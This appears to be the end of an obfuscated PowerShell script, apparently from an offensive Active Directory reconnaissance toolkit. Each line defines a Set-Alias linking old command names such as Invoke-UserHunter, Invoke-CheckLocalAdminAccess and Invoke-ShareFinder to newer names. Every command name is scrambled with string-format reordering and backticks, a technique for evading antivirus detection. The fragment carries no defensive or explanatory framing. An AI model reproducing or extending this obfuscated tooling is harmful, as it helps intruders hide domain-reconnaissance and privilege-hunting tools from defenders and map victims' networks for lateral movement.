&("{0}{2}{1}"-f'Set-A','ias','l') ("{2}{1}{0}" -f 'Acl','Object','Add-') ("{3}{2}{5}{4}{1}{0}"-f 'cl','ectA','m','Add-Do','Obj','ain')
&("{0}{1}{2}"-f'Set','-A','lias') ("{0}{3}{1}{2}"-f 'Invo','ACLSca','nner','ke-') ("{0}{5}{4}{1}{6}{2}{3}" -f'F','e','ngDom','ainAcl','nd-Int','i','resti')
&("{2}{3}{0}{1}" -f 'ia','s','Set','-Al') ("{0}{2}{1}{3}" -f 'G','M','et-GUID','ap') ("{1}{3}{2}{0}{4}"-f'Ma','Get','mainGUID','-Do','p')
&("{1}{2}{0}"-f 'ias','Set-','Al') ("{1}{2}{0}" -f 'OU','G','et-Net') ("{0}{2}{1}"-f 'Get-Doma','U','inO')
&("{1}{0}{2}"-f'ia','Set-Al','s') ("{2}{0}{1}" -f'tSi','te','Get-Ne') ("{1}{0}{3}{2}" -f 'et-Doma','G','te','inSi')
&("{1}{3}{0}{2}"-f 'Alia','Set','s','-') ("{1}{0}{2}{3}" -f 'e','G','t','-NetSubnet') ("{1}{0}{2}{3}" -f'ainSubn','Get-Dom','e','t')
&("{0}{1}{2}"-f'Set-Ali','a','s') ("{2}{0}{1}" -f 't-Net','Group','Ge') ("{1}{3}{2}{0}" -f'p','Ge','inGrou','t-Doma')
&("{2}{1}{0}"-f's','a','Set-Ali') ("{2}{3}{1}{0}{4}"-f'edSec','anag','Fin','d-M','urityGroups') ("{7}{2}{5}{3}{4}{8}{6}{0}{1}" -f'r','oup','oma','anagedSec','u','inM','yG','Get-D','rit')
&("{2}{1}{0}" -f'ias','et-Al','S') ("{2}{1}{0}{3}"-f 'Grou','Net','Get-','pMember') ("{2}{1}{3}{4}{0}"-f'ber','om','Get-D','ainGro','upMem')
&("{1}{2}{0}" -f 'as','Set-','Ali') ("{3}{1}{2}{0}"-f'ver','tF','ileSer','Get-Ne') ("{0}{2}{1}{5}{3}{4}"-f 'Get','mai','-Do','ve','r','nFileSer')
&("{0}{2}{1}"-f 'S','lias','et-A') ("{3}{2}{0}{1}" -f'DF','Sshare','et-','G') ("{2}{3}{4}{0}{1}" -f'inDF','SShare','Get','-Dom','a')
&("{1}{2}{0}{3}" -f'ia','Set-A','l','s') ("{1}{2}{0}"-f 'GPO','Ge','t-Net') ("{3}{0}{2}{1}" -f 'et-Domain','O','GP','G')
&("{2}{0}{1}"-f't-Alia','s','Se') ("{2}{0}{1}" -f 'NetGPO','Group','Get-') ("{1}{4}{0}{3}{2}"-f'lGr','Get-Do','up','o','mainGPOLoca')
&("{1}{3}{2}{0}"-f'ias','S','l','et-A') ("{0}{3}{2}{4}{1}"-f'F','ocation','G','ind-','POL') ("{6}{0}{8}{4}{3}{5}{9}{2}{1}{7}"-f '-','i','Mapp','nGPOUse','ai','rLocal','Get','ng','Dom','Group')
&("{0}{1}{2}"-f'Set-A','lia','s') ("{4}{3}{2}{0}{1}"-f'rA','dmin','pute','m','Find-GPOCo') ("{6}{3}{5}{4}{2}{0}{1}" -f 'pin','g','pMap','omain','POComputerLocalGrou','G','Get-D')
&("{0}{1}{2}"-f'Set-','A','lias') ("{2}{1}{3}{0}" -f 'ocal','dO','Get-Logge','nL') ("{2}{0}{1}{3}{4}"-f 'et-','Re','G','g','LoggedOn')
&("{2}{0}{1}"-f 't-Alia','s','Se') ("{5}{6}{1}{0}{4}{3}{2}" -f'Local','Check','ss','inAcce','Adm','Invok','e-') ("{3}{5}{4}{0}{2}{1}"-f'-Admi','Access','n','T','st','e')
&("{1}{0}{2}" -f 'e','S','t-Alias') ("{0}{1}{2}"-f 'Ge','t-Sit','eName') ("{1}{3}{4}{2}{0}" -f 'eName','Get-NetC','it','om','puterS')
&("{2}{0}{1}"-f 'li','as','Set-A') ("{0}{2}{1}" -f'Ge','Proxy','t-') ("{1}{4}{3}{2}{0}"-f'oxy','Get','r','RegP','-WMI')
&("{1}{0}{2}{3}"-f 't-A','Se','li','as') ("{0}{5}{3}{2}{1}{4}"-f 'G','gedO','og','L','n','et-Last') ("{1}{0}{2}{6}{3}{5}{4}" -f't','Ge','-WM','a','gedOn','stLog','IRegL')
&("{3}{1}{0}{2}"-f '-Alia','et','s','S') ("{0}{4}{1}{3}{2}"-f 'Ge','dRD','n','PConnectio','t-Cache') ("{8}{5}{0}{4}{2}{7}{1}{3}{6}" -f'-WMIRegCache','nnect','D','io','dR','et','n','PCo','G')
&("{0}{2}{1}"-f'S','s','et-Alia') ("{4}{2}{3}{5}{0}{1}" -f'r','ive','et-Re','gistryMounted','G','D') ("{5}{2}{1}{3}{0}{6}{4}" -f'i','unted','WMIRegMo','Dr','e','Get-','v')
&("{0}{2}{1}" -f 'S','-Alias','et') ("{0}{3}{1}{2}"-f'Get','Proce','ss','-Net') ("{1}{0}{2}"-f 'o','Get-WMIPr','cess')
&("{0}{1}{2}{3}" -f'S','et','-','Alias') ("{1}{0}{3}{2}{4}" -f'o','Inv','e-Threaded','k','Function') ne`w-ThRE`Ad`edFunCTIoN
&("{1}{0}{2}"-f 'e','S','t-Alias') ("{2}{1}{0}{3}" -f'serHun','-U','Invoke','ter') ("{4}{0}{1}{2}{3}" -f'-Domain','UserLoca','t','ion','Find')
&("{1}{3}{0}{2}"-f '-A','S','lias','et') ("{1}{3}{4}{2}{0}"-f 'r','Invok','te','e-Process','Hun') ("{5}{0}{1}{3}{4}{2}"-f'a','inPr','s','oc','es','Find-Dom')
&("{1}{2}{3}{0}" -f 's','Se','t-','Alia') ("{0}{2}{3}{1}" -f'Inv','unter','oke-Even','tH') ("{0}{1}{3}{4}{2}"-f 'Fin','d-Domai','Event','nU','ser')
&("{0}{1}{2}"-f'S','e','t-Alias') ("{2}{3}{5}{1}{4}{0}" -f'eFinder','Sh','Invo','ke','ar','-') ("{0}{2}{1}"-f 'Fin','e','d-DomainShar')
&("{0}{2}{1}" -f 'Set','s','-Alia') ("{3}{2}{0}{1}"-f 'in','der','voke-FileF','In') ("{3}{0}{2}{1}{4}{5}" -f 'ntere','ngDomain','sti','Find-I','Share','File')
&("{0}{1}{2}" -f'Se','t-Al','ias') ("{7}{5}{2}{4}{1}{3}{0}{6}"-f 'm','calA','r','d','ateLo','e','in','Invoke-Enum') ("{1}{3}{6}{4}{5}{2}{0}" -f 'mber','F','e','ind','ocalGro','upM','-DomainL')
&("{2}{0}{1}"-f 't-Ali','as','Se') ("{4}{2}{1}{0}{3}{5}"-f 'tDom','Ne','t-','a','Ge','inTrust') ("{0}{3}{2}{1}"-f'G','ust','t-DomainTr','e')
&("{1}{0}{2}"-f '-','Set','Alias') ("{3}{0}{2}{1}" -f'e','ForestTrust','t-Net','G') ("{0}{3}{2}{1}"-f'Ge','t','ForestTrus','t-')
&("{0}{2}{1}"-f 'S','t-Alias','e') ("{2}{0}{1}"-f 'ind-F','oreignUser','F') ("{4}{3}{2}{0}{1}"-f 'eignUs','er','DomainFor','t-','Ge')
&("{3}{2}{1}{0}" -f'ias','Al','t-','Se') ("{2}{0}{3}{1}"-f 'ore','nGroup','Find-F','ig') ("{2}{0}{4}{1}{3}{5}"-f'et','omainForeignGroupM','G','embe','-D','r')
&("{0}{2}{1}" -f 'S','lias','et-A') ("{4}{2}{3}{0}{5}{1}"-f 'M','ainTrust','nvoke','-','I','apDom') ("{2}{3}{1}{0}"-f'pping','ainTrustMa','G','et-Dom')
&("{2}{1}{0}" -f'-Alias','et','S') ("{0}{3}{2}{1}" -f'Get','nPolicy','i','-Doma') ("{2}{3}{0}{1}{4}"-f'ol','i','G','et-DomainP','cyData')

